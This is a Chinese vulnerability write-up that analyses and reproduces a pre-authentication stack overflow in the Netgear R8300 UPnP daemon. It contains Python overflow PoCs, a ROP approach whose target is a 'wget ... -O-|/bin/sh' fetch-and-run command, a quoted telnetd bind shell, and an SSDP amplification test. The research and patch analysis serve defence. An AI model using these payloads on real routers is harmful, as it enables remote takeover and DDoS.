> 原文链接: https://www.anquanke.com//post/id/215428 


# Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现


                                阅读量   
                                **129665**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t0196d164e789f8a6de.jpg)](https://p1.ssl.qhimg.com/t0196d164e789f8a6de.jpg)



作者：fenix@知道创宇404实验室

# <a class="reference-link" name="1.%E5%89%8D%E8%A8%80"></a>1.前言

R8300 是 Netgear 旗下的一款三频无线路由，主要在北美发售，官方售价 $229.99。

2020 年 7 月 31 日，Netgear 官方发布安全公告，在更新版固件 1.0.2.134 中修复了 R8300 的一个未授权 RCE 漏洞[【1】](https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211)。2020 年 8 月 18 日，SSD Secure Disclosure 上公开了该漏洞的细节及 EXP[【2】](https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/)。

该漏洞位于路由器的 UPnP 服务中， 由于解析 SSDP 协议数据包的代码存在缺陷，导致未经授权的远程攻击者可以发送特制的数据包使得栈上的 buffer 溢出，进一步控制 PC 执行任意代码。

回顾了下整个复现流程还是很有趣的，特此记录。



## 2.环境搭建

下面先搭建漏洞调试环境。在有设备的情况下，有多种直接获取系统 shell 的方式，如：
1. 硬件调试接口，如：UART
<li>历史 RCE 漏洞，如：NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞[【3】](https://www.seebug.org/vuldb/ssvid-98253)
</li>
<li>设备自身的后门，Unlocking the Netgear Telnet Console[【4】](https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500)
</li>
1. 破解固件检验算法，开启 telnet 或植入反连程序。
不幸的是，没有设备…

理论上，只要 CPU 指令集对的上，就可以跑起来，所以我们还可以利用手头的树莓派、路由器摄像头的开发板等来运行。最后一个就是基于 QEMU 的指令翻译，可以在现有平台上模拟 ARM、MIPS、X86、PowerPC、SPARK 等多种架构。

### <a class="reference-link" name="%E4%B8%8B%E8%BD%BD%E5%9B%BA%E4%BB%B6"></a>下载固件

Netgear 还是很良心的，在官网提供了历史固件下载。

下载地址：[【5】](https://www.netgear.com/support/product/R8300.aspx#download)

下载的固件 md5sum 如下：

```
c3eb8f8c004d466796a05b4c60503162  R8300-V1.0.2.130_1.0.99.zip - 漏洞版本
abce2193f5f24f743c738d24d36d7717  R8300-V1.0.2.134_1.0.99.zip - 补丁版本
```

binwalk 可以正确识别。

```
? binwalk R8300-V1.0.2.130_1.0.99.chk

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
58            0x3A            TRX firmware header, little endian, image size: 32653312 bytes, CRC32: 0x5CEAB739, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21AB50, rootfs offset: 0x0
86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5470272 bytes
2206602       0x21AB8A        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 30443160 bytes, 1650 inodes, blocksize: 131072 bytes, created: 2018-12-13 04:36:38
```

使用 `binwalk  -Me` 提取出 Squashfs 文件系统，漏洞程序是 `ARMv5` 架构，动态链接，且去除了符号表。

```
?  squashfs-root ls
bin   dev   etc   lib   media mnt   opt   proc  sbin  share sys   tmp   usr   var   www
?  squashfs-root find . -name upnpd
./usr/sbin/upnpd
?  squashfs-root file ./usr/sbin/upnpd
./usr/sbin/upnpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

### <a class="reference-link" name="QEMU%20%E6%A8%A1%E6%8B%9F"></a>QEMU 模拟

在基于 QEMU 的固件模拟这块，网上也有一些开源的平台，如比较出名的 firmadyne[【6】](https://github.com/firmadyne/firmadyne)、ARM-X[【7】](https://github.com/therealsaumil/armx)。不过相比于使用这种集成环境，我更倾向于自己动手，精简但够用。

相应的技巧在之前的文章 《Vivotek 摄像头远程栈溢出漏洞分析及利用》[【8】](https://paper.seebug.org/480/) 也有提及，步骤大同小异。

在 Host 机上创建一个 tap 接口并分配 IP，启动虚拟机：

```
sudo tunctl -t tap0 -u `whoami`
sudo ifconfig tap0 192.168.2.1/24
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
```

用户名和密码都是 root，为虚拟机分配 IP：

```
ifconfig eth0 192.168.2.2/24
```

这样 Host 和虚拟机就网络互通了，然后挂载 proc、dev，最后 chroot 即可。

```
root@debian-armhf:~# ls
squashfs-root
root@debian-armhf:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56
          inet addr:192.168.2.2  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:96350 errors:0 dropped:0 overruns:0 frame:0
          TX packets:98424 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:7945287 (7.5 MiB)  TX bytes:18841978 (17.9 MiB)
          Interrupt:47

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:55 errors:0 dropped:0 overruns:0 frame:0
          TX packets:55 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:304544 (297.4 KiB)  TX bytes:304544 (297.4 KiB)

root@debian-armhf:~# mount -t proc /proc ./squashfs-root/proc
root@debian-armhf:~# mount -o bind /dev ./squashfs-root/dev
root@debian-armhf:~# chroot ./squashfs-root/ sh


BusyBox v1.7.2 (2018-12-13 12:34:27 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# id
uid=0 gid=0(root)
#
```

### <a class="reference-link" name="%E4%BF%AE%E5%A4%8D%E8%BF%90%E8%A1%8C%E4%BE%9D%E8%B5%96"></a>修复运行依赖

直接运行没有任何报错就退出了，服务也没启动。

[![](https://p1.ssl.qhimg.com/t017f61595ca34021e2.jpg)](https://p1.ssl.qhimg.com/t017f61595ca34021e2.jpg)

经过调试发现是打开文件失败。

[![](https://p3.ssl.qhimg.com/t010c3696a79b8e892b.jpg)](https://p3.ssl.qhimg.com/t010c3696a79b8e892b.jpg)

手动创建 `/tmp/var/run` 目录，再次运行提示缺少 `/dev/nvram`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0129b05110c8885311.jpg)

NVRAM( 非易失性 RAM) 用于存储路由器的配置信息，而 upnpd 运行时需要用到其中部分配置信息。在没有硬件设备的情况下，我们可以使用 `LD_PRELOAD` 劫持以下函数符号。

[![](https://p2.ssl.qhimg.com/t01af9e4570aaede6e6.jpg)](https://p2.ssl.qhimg.com/t01af9e4570aaede6e6.jpg)

网上找到一个现成的实现：[【9】](https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c)，交叉编译：

```
? armv5l-gcc -Wall -fPIC -shared custom_nvram_r6250.c -o nvram.so
```

[![](https://p5.ssl.qhimg.com/t01552b55ef5d467862.jpg)](https://p5.ssl.qhimg.com/t01552b55ef5d467862.jpg)

还是报错，找不到 `dlsym` 的符号。之所以会用到 `dlsym`，是因为该库的实现者还同时 hook 了 `system`、`fopen`、`open` 等函数，这对于修复文件缺失依赖，查找命令注入漏洞大有裨益。

[![](https://p2.ssl.qhimg.com/t015482428b165df0ef.jpg)](https://p2.ssl.qhimg.com/t015482428b165df0ef.jpg)

`/lib/libdl.so.0` 导出了该符号。

```
? grep -r "dlsym" .
Binary file ./lib/libcrypto.so.1.0.0 matches
Binary file ./lib/libdl.so.0 matches
Binary file ./lib/libhcrypto-samba4.so.5 matches
Binary file ./lib/libkrb5-samba4.so.26 matches
Binary file ./lib/libldb.so.1 matches
Binary file ./lib/libsamba-modules-samba4.so matches
Binary file ./lib/libsqlite3.so.0 matches
grep: ./lib/modules/2.6.36.4brcmarm+: No such file or directory

? readelf -a ./lib/libdl.so.0 | grep dlsym
    26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e56982db8623bc31.jpg)

可以跑起来了，不过由于缺少配置信息，还是会异常退出。接下来要做的就是根据上面的日志补全配置信息，其实特别希望能有一台 R8300，导出里面的 nvram 配置…

简单举个例子，`upnpd_debug_level` 是控制日志级别的，`sub_B813()` 是输出日志的函数，只要 `upnpd_debug_level &gt; sub_B813() 的第一个参数`，就可以在终端输出日志。

[![](https://p1.ssl.qhimg.com/t01c9d0fcf176df96d0.jpg)](https://p1.ssl.qhimg.com/t01c9d0fcf176df96d0.jpg)

下面分享一份 nvram 配置，至于为什么这么设置，可以查看对应的汇编代码逻辑（配置的有问题的话很容易触发段错误）。

```
upnpd_debug_level=9
lan_ipaddr=192.168.2.2
hwver=R8500
friendly_name=R8300
upnp_enable=1
upnp_turn_on=1
upnp_advert_period=30
upnp_advert_ttl=4
upnp_portmap_entry=1
upnp_duration=3600
upnp_DHCPServerConfigurable=1
wps_is_upnp=0
upnp_sa_uuid=00000000000000000000
lan_hwaddr=AA:BB:CC:DD:EE:FF
```

upnpd 服务成功运行！

[![](https://p1.ssl.qhimg.com/t01c34969b1b60234ee.jpg)](https://p1.ssl.qhimg.com/t01c34969b1b60234ee.jpg)



## 3.漏洞分析

该漏洞的原理很简单，使用 `strcpy()` 拷贝导致的缓冲区溢出，来看看调用流程。

在 `sub_1D020()` 中使用 `recvfrom()` 从套接字接受最大长度 `0x1fff` 的 UDP 报文数据。

[![](https://p5.ssl.qhimg.com/t01d6ecf075b544803c.jpg)](https://p5.ssl.qhimg.com/t01d6ecf075b544803c.jpg)

在 `sub_25E04()` 中调用 `strcpy()` 将以上数据拷贝到大小为 `0x634 - 0x58 = 0x5dc` 的 buffer。

[![](https://p0.ssl.qhimg.com/t019cec38a077f527c6.jpg)](https://p0.ssl.qhimg.com/t019cec38a077f527c6.jpg)



## 4.利用分析

通过 `checksec` 可知程序本身只开了 NX 保护，从原漏洞详情得知 R8300 上开了 ASLR。

[![](https://p3.ssl.qhimg.com/t019cec38a077f527c6.jpg)](https://p3.ssl.qhimg.com/t019cec38a077f527c6.jpg)

很容易构造出可控 PC 的 payload，唯一需要注意的是栈上有个 v39 的指针 v41，覆盖的时候将其指向有效地址即可正常返回。

```
#!/usr/bin/python3

import socket
import struct

p32 = lambda x: struct.pack("&lt;L", x)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = (
    0x604 * b'a' +  # dummy
    p32(0x7e2da53c) +  # v41
    (0x634 - 0x604 - 8) * b'a' +  # dummy
    p32(0x43434343)  # LR
)
s.connect(('192.168.2.2', 1900))
s.send(payload)
s.close()
```

[![](https://p5.ssl.qhimg.com/t0125c5ccc4835b7b60.jpg)](https://p5.ssl.qhimg.com/t0125c5ccc4835b7b60.jpg)

显然，`R4 - R11` 也是可控的，思考一下目前的情况：
1. 开了 NX 不能用 `shellcode`。
1. 有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 `gadget`。
<li>
`strcpy()` 函数导致的溢出，payload 中不能包含 `\x00` 字符。</li>
其实可控 PC 后已经可以干很多事了，`upnpd` 内包含大量 `system` 函数调用，比如 `reboot`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ecbf868186fd4e9f.jpg)

下面探讨下更为 general 的 RCE 利用，一般像这种 ROP 的 payload 中包含 `\x00`，覆盖返回地址的payload 又不能包含 `\x00`，就要想办法提前将 ROP payload 注入目标内存。

比如，利用内存未初始化问题，构造如下 PoC，每个 payload 前添加 `\x00` 防止程序崩溃。

```
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('192.168.2.2', 1900))
s.send(b'\x00' + b'A' * 0x1ff0)
s.send(b'\x00' + b'B' * 0x633)
s.close()
```

在漏洞点下断点，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01397670c980c199cf.jpg)

两次拷贝完成后，看下内存布局：

[![](https://p1.ssl.qhimg.com/t01dea1b78ecde2902e.jpg)](https://p1.ssl.qhimg.com/t01dea1b78ecde2902e.jpg)

可以看到，由于接收 socket 数据的 buffer 未初始化，在劫持 PC 前我们可以往目标内存注入 6500 多字节的数据。<br>
这么大的空间，也足以给 ROP 的 payload 一片容身之地。

借用原作者的一张图，利用原理如下：

[![](https://p5.ssl.qhimg.com/t01751f47c7dd9d7021.png)](https://p5.ssl.qhimg.com/t01751f47c7dd9d7021.png)

关于 ROP，使用 `strcpy` 调用在 bss 上拼接出命令字符串，并调整 R0 指向这段内存，然后跳转 `system` 执行即可。

原作者构造的 `system("telnetd -l /bin/sh -p 9999&amp; ")` 绑定型 shell。

经过分析，我发现可以构造 `system("wget http://`{`reverse_ip`}`:`{`reverse_port`}` -O-|/bin/sh")` 调用，从而无限制任意命令执行。

构造的关键在于下面这张表。

[![](https://p0.ssl.qhimg.com/t01a9453235c5b313c2.jpg)](https://p0.ssl.qhimg.com/t01a9453235c5b313c2.jpg)

发送 payload，通过 hook 的日志可以看到，ROP 利用链按照预期工作，可以无限制远程命令执行。<br>
（由于模拟环境的问题，wget 命令运行段错误了…）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01dc4fea0b34db900a.jpg)



## 5.补丁分析

在更新版固件 `V1.0.2.134` 中，用 `strncpy()` 代替 `strcpy()`，限制了拷贝长度为 `0x5db`，正好是 buffer 长度减 1。

补丁中还特意用 `memset()` 初始化了 buffer。这是由于 `strncpy()` 在拷贝时，如果 n &lt; src 的长度，只是将 src 的前 n 个字符复制到 dest 的前 n 个字符，不会自动添加 `\x00`，也就是结果 dest 不包括 `\x00`，需要再手动添加一个 `\x00`；如果 src 的长度小于 n 个字节，则以`\x00` 填充 dest 直到复制完 n 个字节。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c3925bf4d8614377.jpg)

结合上面的 RCE 利用过程，可见申请内存之后及时初始化是个很好的编码习惯，也能一定程度上避免很多安全问题。



## 6.影响范围

通过 ZoomEye 网络空间搜索引擎对关键字 `"SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0"` 进行搜索，共发现 18889 条 Netgear UPnP 服务的 IP 历史记录，主要分布在美国[【10】](https://www.zoomeye.org/searchResult?q=%22SERVER%3A%20Linux%2F2.6.12%2C%20UPnP%2F1.0%2C%20NETGEAR-UPNP%2F1.0%22)。其中是 R8300 这个型号的会受到该漏洞影响。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01175fe8d4cc21a2ab.jpg)



## 7.其他

说句题外话，由于协议设计缺陷，历史上 UPnP 也被多次曝出漏洞，比如经典的 SSDP 反射放大用来 DDoS 的问题。

在我们的模拟环境中进行测试，发送 132 bytes 的 `ST: ssdp:all M-SEARCH` 查询请求 ，服务器响应了 4063 bytes 的数据，放大倍率高达 30.8。

因此，建议网络管理员禁止 SSDP UDP 1900 端口的入站请求。

```
? pocsuite -r upnp_ssdp_ddos_poc.py -u 192.168.2.2 -v 2

,------.                        ,--. ,--.       ,----.   `{`1.5.9-nongit-20200408`}`
|  .--. ',---. ,---.,---.,--.,--`--,-'  '-.,---.'.-.  |
|  '--' | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. : .' &lt;
|  | --'' '-' \ `--.-'  `'  ''  |  | |  | \   --/'-'  |
`--'     `---' `---`----' `----'`--' `--'  `----`----'   http://pocsuite.org
[*] starting at 11:05:18

[11:05:18] [INFO] loading PoC script 'upnp_ssdp_ddos_poc.py'
[11:05:18] [INFO] pocsusite got a total of 1 tasks
[11:05:18] [DEBUG] pocsuite will open 1 threads
[11:05:18] [INFO] running poc:'upnp ssdp ddos' target '192.168.2.2'

[11:05:28] [DEBUG] timed out
[11:05:28] [DEBUG] HTTP/1.1 200 OK
ST: upnp:rootdevice
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1::upnp:rootdevice

HTTP/1.1 200 OK
ST: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1

HTTP/1.1 200 OK
ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:device:InternetGatewayDevice:1

HTTP/1.1 200 OK
ST: uuid:6cbbc296-de32-bde2-3d68-5576da5933d1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de32-bde2-3d68-5576da5933d1

HTTP/1.1 200 OK
ST: urn:schemas-upnp-org:device:WANDevice:1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de32-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:device:WANDevice:1

HTTP/1.1 200 OK
ST: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1

HTTP/1.1 200 OK
ST: urn:schemas-upnp-org:device:WANConnectionDevice:1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:device:WANConnectionDevice:1

HTTP/1.1 200 OK
ST: urn:schemas-upnp-org:service:Layer3Forwarding:1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:Layer3Forwarding:1

HTTP/1.1 200 OK
ST: urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de32-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1

HTTP/1.1 200 OK
ST: urn:schemas-upnp-org:service:WANEthernetLinkConfig:1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:WANEthernetLinkConfig:1

HTTP/1.1 200 OK
ST: urn:schemas-upnp-org:service:WANIPConnection:1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:WANIPConnection:1

HTTP/1.1 200 OK
ST: urn:schemas-upnp-org:service:WANPPPConnection:1
LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml
SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0
EXT:
CACHE-CONTROL: max-age=3600
USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:WANPPPConnection:1


[11:05:28] [+] URL : http://192.168.2.2
[11:05:28] [+] Info : Send: 132 bytes, receive: 4063 bytes, amplification: 30.78030303030303
[11:05:28] [INFO] Scan completed,ready to print

+-------------+----------------+--------+-----------+---------+---------+
| target-url  |    poc-name    | poc-id | component | version |  status |
+-------------+----------------+--------+-----------+---------+---------+
| 192.168.2.2 | upnp ssdp ddos |        |           |         | success |
+-------------+----------------+--------+-----------+---------+---------+
success : 1 / 1

[*] shutting down at 11:05:28
```



## 8.相关链接

【1】: Netgear 官方安全公告

[https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211](https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211)

【2】: 漏洞详情

[https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/](https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/)

【3】: NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞

[https://www.seebug.org/vuldb/ssvid-98253](https://www.seebug.org/vuldb/ssvid-98253)

【4】: Unlocking the Netgear Telnet Console

[https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500](https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500)

【5】: 固件下载

[https://www.netgear.com/support/product/R8300.aspx#download](https://www.netgear.com/support/product/R8300.aspx#download)

【6】: firmadyne

[https://github.com/firmadyne/firmadyne](https://github.com/firmadyne/firmadyne)

【7】: ARM-X

[https://github.com/therealsaumil/armx](https://github.com/therealsaumil/armx)

【8】: Vivotek 摄像头远程栈溢出漏洞分析及利用

[https://paper.seebug.org/480/](https://paper.seebug.org/480/)

【9】: nvram hook 库

[https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c](https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c)

【10】: ZoomEye 搜索

[https://www.zoomeye.org/searchResult?q=%22SERVER%3A%20Linux%2F2.6.12%2C%20UPnP%2F1.0%2C%20NETGEAR-UPNP%2F1.0%22](https://www.zoomeye.org/searchResult?q=%22SERVER%3A%20Linux%2F2.6.12%2C%20UPnP%2F1.0%2C%20NETGEAR-UPNP%2F1.0%22)
